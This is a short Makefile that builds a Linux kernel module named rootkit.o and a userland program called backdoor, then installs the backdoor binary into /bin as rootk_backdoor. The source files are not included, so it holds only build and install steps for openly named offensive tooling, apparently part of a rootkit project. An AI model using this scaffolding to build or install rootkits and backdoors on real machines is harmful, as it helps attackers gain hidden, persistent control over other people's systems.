obj-m += rootkit.o
CC = gcc -Wall
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)
BUILD := $(PWD)/build

all:
	mkdir -p build
	cp $(PWD)/Makefile $(PWD)/build/.
	cp $(PWD)/src/rootkit.c $(PWD)/build/.
	make -C $(KDIR) M=$(BUILD) modules

	gcc -o build/backdoor src/backdoor.c

clean:
	make -C $(KDIR) M=$(BUILD) clean
	rm -rf build
	rm /bin/rootk_backdoor

install:
	cp $(PWD)/build/backdoor /bin/rootk_backdoor